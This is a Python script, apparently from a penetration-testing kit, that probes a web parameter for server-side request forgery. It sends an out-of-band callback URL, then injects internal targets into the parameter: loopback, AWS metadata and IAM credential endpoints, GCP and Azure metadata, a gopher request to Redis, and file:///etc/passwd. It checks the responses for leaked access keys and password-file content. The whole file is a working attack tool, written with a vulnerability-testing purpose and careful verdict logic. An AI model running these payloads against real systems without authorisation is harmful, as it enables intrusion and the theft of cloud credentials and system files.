#!/usr/bin/env python
"""ssrf_probe.py — SSRF ladder tester (server-side request forgery).

Given a URL + a candidate --param (url/callback/webhook/img/file/...), determines
(1) whether the server fetches an attacker-controlled URL (the SSRF PRIMITIVE),
using the in-kit oob.py collaborator for a callback, then (2) escalates to
internal / cloud-metadata reach by reading the RESPONSE body for internal
content. Callback-only with no internal reach = LEAD; metadata/internal content
reflected in the response = CONFIRMED SSRF (per pitfalls.md: an OOB callback
proves the server made a request, not reach to anything sensitive).

Signal matching is CONTENT-BASED to defeat false CONFIRMEDs: a metadata signal
counts only if present in the ladder body AND ABSENT from the benign baseline
body AND NOT a substring of the injected target URL (so a URL-reflecting/echoing
endpoint cannot false-match). AWS IMDS only (ami-id / the AccessKeyId+
SecretAccessKey pair). GCP/Azure IMDS and loopback/localhost reach cannot be
confirmed black-box (the onward Metadata-Flavor/Metadata header is not
attacker-controllable on the internal hop; loopback has no unique marker) — those
are recorded as structural limitations in the output note, never as tested-clean.

Usage: python ssrf_probe.py <url> --param <p> [--method GET|POST]
       [--data 'k=v'] [--collab-host <ip>] [--backend local|interactsh]
       [--concurrency 4] [--timeout 20] [--wait 8]
"""
import argparse, json, sys, time, urllib.request, urllib.parse, urllib.error, ssl, concurrent.futures

# in-kit helper (same directory); the OOB collaborator for blind SSRF callbacks
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import oob as _oob

# internal/metadata targets for the escalation ladder. "headers" carry the
# flavor headers some metadata services REQUIRE (GCP/Azure) — note these are the
# headers the TARGET app would have to forward on the internal hop; black-box we
# cannot control that onward hop, so GCP/Azure IMDS reach is structurally
# unverifiable here (see "limitations" in the output note). "signals" are
# substrings that, if found in the RESPONSE body, prove internal reach — they are
# chosen so they can ONLY appear in real metadata OUTPUT and NEVER as a substring
# of the injected target URL itself (so a URL-reflecting/echoing endpoint cannot
# false-match). A signal counts only if it is in the ladder body AND ABSENT from
# the benign baseline body AND NOT a substring of the injected target URL string
# (see _content_match below).
INTERNAL_TARGETS = [
    {
        "label": "loopback-127",
        "url": "http://127.0.0.1/",
        "headers": {},
        "signals": [],  # generic loopback; no unique marker (see "limitations")
    },
    {
        "label": "localhost",
        "url": "http://localhost/",
        "headers": {},
        "signals": [],  # generic loopback; no unique marker (see "limitations")
    },
    {
        "label": "aws-metadata-base",
        "url": "http://169.254.169.254/latest/meta-data/",
        "headers": {},
        # ami-id is an AWS-only metadata key that never appears in the injected
        # URL path. (instance-id/instance-type dropped: too generic, echo-prone.)
        "signals": [b"ami-id"],
    },
    {
        "label": "aws-iam-creds",
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "headers": {},
        # require the PAIR AccessKeyId+SecretAccessKey — both only ever appear in
        # real IAM credential OUTPUT. Bare "Token" dropped (too generic / echoed);
        # "iam/security-credentials" dropped (it equals the injected URL path, so
        # any URL-reflecting endpoint false-matches it).
        "signals": [b"AccessKeyId", b"SecretAccessKey"],
        "require_all": True,  # ALL listed signals must be present (the cred pair)
    },
    {
        "label": "gcp-metadata",
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "headers": {"Metadata-Flavor": "Google"},  # GCP IMDS requires this header
        # GCP IMDS drops the connection without Metadata-Flavor; black-box we
        # cannot force the target app to send it on the internal hop, so any
        # "clean" result here is unverifiable — recorded as a structural limit.
        "signals": [],  # no confirmable marker black-box (see "limitations")
    },
    {
        "label": "azure-metadata",
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "headers": {"Metadata": "true"},  # Azure IMDS requires this header
        # Azure IMDS requires the Metadata: true header on the internal hop; as
        # with GCP, black-box we cannot force it, so reach is unverifiable here.
        "signals": [],  # no confirmable marker black-box (see "limitations")
    },
]

# non-http schemes — usually fail / blocked; recorded honestly (lead at most)
ALT_SCHEMES = [
    ("gopher", "gopher://127.0.0.1:6379/_INFO"),
    ("file", "file:///etc/passwd"),
]


def _build_request(url, param, value, method, data_tmpl, ctx, extra_headers=None):
    """Build an urllib request with the value injected into param (GET or POST)."""
    if method == "POST":
        post = data_tmpl.replace("__INJECT__", urllib.parse.quote(value, safe=""))
        req = urllib.request.Request(url, data=post.encode(), method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    else:
        sep = "&" if "?" in url else "?"
        req = urllib.request.Request(f"{url}{sep}{param}={urllib.parse.quote(value, safe='')}")
    req.add_header("User-Agent", "Mozilla/5.0 (compatible; SsrfProbe/1.0)")
    if extra_headers:
        for k, v in extra_headers.items():
            req.add_header(k, v)
    return req


def _fetch(req, ctx, timeout):
    """Execute a request, return (status, body_bytes) eating HTTPError into the body."""
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            return r.status, r.read(50000)
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(50000)
        except Exception:
            return e.code, b""
    except Exception:
        return None, b""


def main():
    ap = argparse.ArgumentParser(description="SSRF ladder tester (primitive via OOB callback -> internal/metadata reach).")
    ap.add_argument("url")
    ap.add_argument("--param", required=True, help="parameter suspected of being server-fetched (url/callback/webhook/img/file/...)")
    ap.add_argument("--method", choices=["GET", "POST"], default="GET")
    ap.add_argument("--data", default="", help="POST body template (use __INJECT__ as placeholder for the param value)")
    ap.add_argument("--collab-host", default=None, help="host/IP the target should call back to (default: this host's LAN IP)")
    ap.add_argument("--backend", choices=["local", "interactsh"], default="local",
                    help="OOB collaborator backend (local=stdlib HTTP listener; interactsh=real-target DNS+HTTP via bootstrap)")
    ap.add_argument("--concurrency", type=int, default=4)
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--wait", type=int, default=8, help="seconds to wait for an OOB callback after each primitive probe")
    args = ap.parse_args()

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    data_tmpl = args.data or f"{args.param}=__INJECT__"

    # ---- baseline (benign): capture a benign response to defeat the WAF/SPA catch-all shell ----
    # A uniform 200 for ANY payload (real or random-nonexistent) = the shell, not a finding.
    benign_marker = f"ssrfprobe-benign-{int(time.time())}-{os.getpid()}"
    baseline_req = _build_request(args.url, args.param, benign_marker, args.method, data_tmpl, ctx)
    baseline_status, baseline_body = _fetch(baseline_req, ctx, args.timeout)
    baseline_len = len(baseline_body)
    # a random-nonexistent path baseline too (catches SPA catch-alls)
    rnd_req = urllib.request.Request(
        f"{args.url}{'&' if '?' in args.url else '?'}__ssrfprobe_nx_{int(time.time())}=1",
        headers={"User-Agent": "Mozilla/5.0 (compatible; SsrfProbe/1.0)"},
    )
    rnd_status, rnd_body = _fetch(rnd_req, ctx, args.timeout)
    shell_like = (
        baseline_status == rnd_status == 200
        and baseline_len > 0
        and abs(len(rnd_body) - baseline_len) < 50
    )  # uniform 200 cluster => challenge shell / SPA catch-all

    internal_signals = []
    callback_fired = False
    collab_note = ""
    collab = None

    # ---- STEP 1+2: start collaborator, probe the PRIMITIVE (does the server fetch our URL?) ----
    try:
        collab = _oob.Collab(backend=args.backend, host=args.collab_host)
        collab.start()
        marker = f"ssrfprim-{int(time.time())}-{os.getpid()}"
        callback_url = collab.callback(marker)
        collab_note = f"backend={collab._mode} callback_url={callback_url}"
        prim_req = _build_request(args.url, args.param, callback_url, args.method, data_tmpl, ctx)
        _fetch(prim_req, ctx, args.timeout)
        # poll for the callback (the server fetching our attacker URL)
        callback_fired = bool(collab.poll(marker, timeout=args.wait))
    except Exception as e:
        collab_note = f"collab-unavailable: {str(e)[:120]}"
    finally:
        # the collaborator listener is idle during the response-only escalation
        # ladder below (no callback is polled there); stop it at the end.
        pass

    # ---- STEP 3: escalation ladder — internal/metadata targets, read RESPONSE for content ----
    # Content-based signal match: a signal counts ONLY if it is present in the
    # ladder body AND ABSENT from the benign BASELINE body (so a uniformly-echoing
    # shell or pre-existing content cannot false-match) AND NOT a substring of the
    # injected target URL string (so a URL-reflecting endpoint cannot false-match).
    def _content_match(spec, body, target):
        sigs = spec.get("signals", [])
        if not sigs:
            return []
        target_bytes = target.encode(errors="ignore")
        hits = []
        for sig in sigs:
            if sig not in body:
                continue
            if sig in baseline_body:  # pre-existing in the benign baseline → not from this probe
                continue
            if sig in target_bytes:  # the URL itself is echoed back → not metadata output
                continue
            hits.append(sig.decode(errors="replace"))
        if spec.get("require_all") and len(hits) != len(sigs):
            return []  # require_all: ALL signals must pass (e.g. the IAM cred pair)
        return hits

    def _probe_internal(spec):
        label, target = spec["label"], spec["url"]
        req = _build_request(args.url, args.param, target, args.method, data_tmpl, ctx, extra_headers=spec.get("headers"))
        status, body = _fetch(req, ctx, args.timeout)
        hits = _content_match(spec, body, target)
        return {"label": label, "target": target, "status": status,
                "body_len": len(body), "signals_matched": hits, "headers": spec.get("headers", {})}

    ladder_results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futs = {pool.submit(_probe_internal, spec): spec["label"] for spec in INTERNAL_TARGETS}
        for fut in concurrent.futures.as_completed(futs):
            try:
                r = fut.result()
            except Exception as e:
                r = {"label": futs[fut], "error": str(e)[:120]}
            ladder_results.append(r)

    # ---- scheme probes (gopher/file) — recorded honestly, usually blocked ----
    scheme_results = []
    for scheme, target in ALT_SCHEMES:
        req = _build_request(args.url, args.param, target, args.method, data_tmpl, ctx)
        status, body = _fetch(req, ctx, args.timeout)
        scheme_results.append({"scheme": scheme, "target": target, "status": status,
                               "body_len": len(body),
                               "passwd_reflected": b"root:" in body if scheme == "file" else None})

    if collab:
        try:
            collab.stop()
        except Exception:
            pass

    # ---- VERDICT logic ----
    # CONFIRMED requires real internal/metadata CONTENT in the response. The
    # content match already excludes baseline-echoed and URL-echoed signals, so
    # any remaining signal_matched set is genuine metadata output for its class.
    confirmed_reach = []
    for r in ladder_results:
        if r.get("signals_matched"):
            confirmed_reach.append(r)
            internal_signals.extend(r["signals_matched"])

    if confirmed_reach:
        verdict = "SSRF CONFIRMED — internal/metadata reach"
        note = ("Internal/metadata content reflected in the response (signals: "
                + ", ".join(sorted(set(internal_signals))) +
                "). Demonstrated reach to an AWS metadata/credential endpoint. "
                "LIMITATIONS: GCP/Azure IMDS and loopback/localhost reach cannot be "
                "confirmed black-box (you cannot control the onward Metadata-Flavor / "
                "Metadata header on the internal hop, and loopback has no unique marker), "
                "so a clean-looking result for those is NOT tested-and-clean — it is "
                "unverifiable from this channel and is not a basis for CONFIRMED.")
    elif callback_fired:
        verdict = "SSRF PRIMITIVE (callback only) — LEAD"
        note = ("Server fetched an attacker-controlled URL (OOB callback received) but no "
                "internal/metadata content was reflected. Per pitfalls.md a callback proves the "
                "server makes requests, NOT reach to anything sensitive — escalate via blind exfil "
                "or a browser channel to confirm internal reach before calling this a finding. "
                "LIMITATIONS: GCP/Azure IMDS and loopback/localhost reach cannot be confirmed "
                "black-box (the onward Metadata-Flavor/Metadata header is not attacker-controllable "
                "on the internal hop, and loopback has no unique marker); absence of a signal for "
                "those classes is unverifiable, not tested-and-clean.")
    else:
        verdict = "no SSRF signal"
        note = ("No OOB callback and no internal/metadata content reflected. If a WAF/JS-challenge "
                "shell is suspected (uniform-200 baseline), re-test through the browser channel. "
                "LIMITATIONS: GCP/Azure IMDS and loopback/localhost reach cannot be confirmed "
                "black-box (the onward Metadata-Flavor/Metadata header is not attacker-controllable "
                "on the internal hop, and loopback has no unique marker); absence of a signal for "
                "those classes is unverifiable, not tested-and-clean.")

    out = {
        "target": args.url,
        "param": args.param,
        "ok": True,
        "callback_fired": callback_fired,
        "internal_reach": bool(confirmed_reach),
        "internal_signals": sorted(set(internal_signals)),
        "baseline": {"status": baseline_status, "body_len": baseline_len,
                     "random_path_status": rnd_status, "random_path_len": len(rnd_body),
                     "shell_like": shell_like},
        "collab": collab_note,
        "verdict": verdict,
        "results": {
            "ladder": ladder_results,
            "alt_schemes": scheme_results,
        },
        "note": note,
    }
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
